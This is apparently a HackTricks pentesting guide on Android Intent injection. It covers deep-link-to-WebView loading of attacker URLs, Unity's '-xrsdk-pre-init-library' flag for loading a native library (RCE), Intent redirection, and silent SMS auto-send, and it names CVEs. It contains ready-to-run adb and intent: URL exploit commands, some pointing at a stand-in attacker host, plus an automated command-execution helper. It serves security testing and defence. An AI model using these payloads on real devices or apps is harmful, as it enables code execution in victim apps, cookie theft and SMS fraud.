# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection abuses components that accept attacker-controlled Intents or data that is later converted into Intents. Two very common patterns during Android app pentests are:

- Passing crafted extras to exported Activities/Services/BroadcastReceivers that are later forwarded to privileged, non-exported components.
- Triggering exported VIEW/BROWSABLE deep links that forward attacker-controlled URLs into internal WebViews or other sensitive sinks.

## Deep links → WebView sink (URL parameter injection)

If an app exposes a custom scheme deep link such as:

```text
myscheme://com.example.app/web?url=<attacker_url>
```

and the receiving Activity forwards the `url` query parameter into a WebView, you can force the app to render arbitrary remote content in its own WebView context.

PoC via adb:

```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```

Impact
- HTML/JS executes inside the app’s WebView profile.
- If JavaScript is enabled (by default or due to misordered checks), you can enumerate/use any exposed `@JavascriptInterface` objects, steal WebView cookies/local storage, and pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Order-of-checks bug enabling JavaScript

A recurring bug is enabling JavaScript (or other permissive WebView settings) before the final URL allowlist/verification finishes. If early helpers accept your deep link and the WebView is configured first, your final load happens with JavaScript already enabled even if later checks are flawed or too late.

What to look for in decompiled code:
- Multiple helpers that parse/split/rebuild the URL differently (inconsistent normalization).
- Calls to `getSettings().setJavaScriptEnabled(true)` before the last host/path allowlist check.
- A pipeline like: parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity-based Android apps typically use `com.unity3d.player.UnityPlayerActivity` (or `UnityPlayerGameActivity`) as the entry Activity. Unity’s Android template treats a special Intent extra named `unity` as a string of command-line flags for the Unity runtime. When the entry Activity is exported (default in many templates), any local app – and sometimes a website if `BROWSABLE` is present – can supply this extra.

A dangerous, undocumented flag leads to native code execution during very early process initialization:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` very early in init, loading attacker-controlled ELF inside the target app’s process with its UID and permissions.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```

Why it works
- The Intent extra `unity` is parsed into Unity runtime flags.
- Supplying the pre-init flag points Unity at an attacker-controlled ELF path within an allowed linker namespace path (see constraints below).

Conditions for exploitation
- The Unity entry Activity is exported (commonly true by default).
- For one-click remote via browser: the entry Activity also declares `android.intent.category.BROWSABLE` so extras can be passed from an `intent:` URL.

Local exploitation (same device)
1) Place a payload ELF at a path readable by the victim app. Easiest: ship a malicious library in your own attacker app and ensure it is extracted under `/data/app/.../lib/<abi>/` by setting in the attacker’s manifest:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Launch the victim’s Unity activity with the CLI pre-init flag in the `unity` extra. Example ADB PoC:
```bash
adb shell am start \
  -n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
  -e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; your payload runs in the victim process, inheriting all its app permissions (camera/mic/network/storage, etc.) and access to in-app sessions/data.

Notes
- The exact `/data/app/...` path varies across devices/installs. An attacker app can retrieve its own native lib dir at runtime via `getApplicationInfo().nativeLibraryDir` and communicate it to the trigger.
- The file need not end with `.so` if it is a valid ELF – `dlopen()` cares about ELF headers, not extensions.

Remote one‑click via browser (conditional)
If the Unity entry activity is exported with `BROWSABLE`, a website can pass extras via an `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
However, on modern Android the dynamic linker namespaces and SELinux block loading from many public paths (e.g., `/sdcard/Download`). You’ll see errors like:
```text
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Bypass strategy: target apps that cache attacker-controlled bytes under their private storage (e.g., HTTP caches). Because permitted paths include `/data` and the app’s private dir, pointing `-xrsdk-pre-init-library` at an absolute path inside the app’s cache can satisfy linker constraints and yield code execution. This mirrors prior cache-to-ELF RCE patterns experienced in other Android apps.


## Other classic Intent injection primitives

- startActivity/sendBroadcast using attacker-supplied `Intent` extras that are later re-parsed (`Intent.parseUri(...)`) and executed.
- Exported proxy components that forward Intents to non-exported sensitive components without permission checks.

---

## Automating exported-component testing (Smali-driven ADB generation)

When exported components expect specific extras, guessing payload shape causes time waste and false negatives. You can automate discovery of keys/types directly from Smali and emit ready-to-run adb commands.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: decompile and scan Smali for calls like `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` to infer which extras and fields are consumed by each component.
- Output: for every exported Activity/Service/Receiver/Provider, the tool prints a short explanation and the exact `adb shell am ...`/`cmd content ...` command with correctly typed flags.

Install
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```

Usage
```bash
python apk-components-inspector.py target.apk
```
Example output
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```

ADB am extras cheat sheet (type-aware flags)
- Strings: `--es key value` | String array: `--esa key v1,v2`
- Integers: `--ei key 123` | Int array: `--eia key 1,2,3`
- Booleans: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URIs (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Component extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Common flags: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro tips for Providers
- Use `adb shell cmd content query|insert|update|delete ...` to hit ContentProviders without agents.
- For SQLi probing, vary `--projection` and `--where` (aka selection) when the underlying provider is SQLite-backed.

Full-pipeline automation (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>Helper script (merges continued lines, executes only lines starting with adb)</summary>

```python
import subprocess

def parse_adb_commands(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    commands = []
    current = []
    for line in lines:
        s = line.strip()
        if s.startswith("adb "):
            current = [s]
        elif s.startswith("#") or not s:
            if current:
                full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
                commands.append(full)
                current = []
        elif current:
            current.append(s)
    if current:
        full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
        commands.append(full)
    return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
    print(f"\nCommand {i}: {cmd}")
    input("Press Enter to execute this command...")
    try:
        r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
        print("Output:\n", r.stdout)
        if r.stderr:
            print("Errors:\n", r.stderr)
    except subprocess.CalledProcessError as e:
        print(f"Command failed with error:\n{e.stderr}")
```

</details>
Run on-device: the inspector is Python-based and works in Termux or rooted phones where `apktool`/`androguard` are available.

---

## Intent Redirection (CWE-926) – finding and exploiting

Pattern
- An exported entry point (Activity/Service/Receiver) reads an incoming Intent and forwards it internally or externally without validating source/data, e.g.:
  - `startActivity(getIntent())`
  - `startActivity(intent)` where `intent` came from an extra like `redirect_intent`/`next_intent`/`pending_intent` or `Intent.parseUri(...)`.
  - Trusting `action`/`data`/`component` fields without checks; not verifying caller identity.

What to search in Smali/Java
- Uses of `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Direct `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` on attacker-influenced Intents.
- Lack of `getCallingPackage()`/`getCallingActivity()` checks or custom permission gates.

ADB PoC templates
- Proxy Activity forwarding an extra Intent to a privileged internal Activity:
```bash
adb shell am start -n com.target/.ProxyActivity \
  --es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Exported Service that honors a `redirect_intent` parcelable:
```bash
adb shell am startservice -n com.target/.ExportedService \
  --es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver that relays without validation:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
  --es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Flags helpful for singleTask-style behavior
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```

Real-world examples (impact varies):
- CVE-2024-26131 (Element Android): exported flows leading to WebView manipulation, PIN bypass, login hijack.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → system-level effects.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): redirection → arbitrary file access (w/ user interaction).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## Abusing ACTION_SENDTO sms/smsto/mms/mmsto against default SMS handlers (Wear OS auto-send)

Abuse pattern
- On Android (incl. Wear OS), an implicit `Intent.ACTION_SENDTO` with a data URI `sms:`, `smsto:`, `mms:`, or `mmsto:` is routed to the system’s default SMS/MMS/RCS app.
- Secure behavior: the target opens a composer UI and requires explicit user confirmation.
- Vulnerable behavior: the target auto-sends immediately when invoked via inter-app `startActivity(...)`, so the caller needs no `SEND_SMS` or privileged permissions.

Minimal trigger (Kotlin)
```kotlin
val i = Intent(Intent.ACTION_SENDTO, Uri.parse("smsto:+15551234567"))
i.putExtra("sms_body", "hello from watch")
startActivity(i)
```

ADB PoC
```bash
adb shell am start -a android.intent.action.SENDTO \
  -d "smsto:+15551234567" --es sms_body "hello from watch"
```

Notes and variants
- The following also resolve to the default handler: `sms:+15551234567`, `mms:+15551234567`, `mmsto:+15551234567`.
- Extras commonly honored: `sms_body` (message body). Some handlers also accept `subject` for MMS.
- Because Intents are inter-app IPC, the caller app does NOT need the `android.permission.SEND_SMS` permission.
- On Wear OS, Tiles/Complications that can launch Activities can fire the same `SENDTO` to achieve silent dispatch if the handler mis-implements the compose flow.

Impact
- Silent, unauthorized SMS/MMS/RCS transmission from the victim device (spam, premium-SMS fraud, OTP/social engineering, privacy leakage).

Hunting tips
- Ensure the target app is set as the default SMS app, then trigger the PoC. If a compose UI is shown, behavior is correct; if a message is sent without UI, it’s vulnerable.
- Test all four schemes (`sms:`, `smsto:`, `mms:`, `mmsto:`) and with/without `sms_body`.
- Observe device UI/logcat for immediate send events when the Activity is launched from a third-party app.

Example affected class of apps
- Default SMS handlers (e.g., Messages variants) on Wear OS builds that mis-handle `ACTION_SENDTO` by taking an auto-send path instead of guarded UI.

---

## References

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 – Wear OS Google Messages ACTION_SENDTO auto-send (PoC and details)](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)

{{#include ../../banners/hacktricks-training.md}}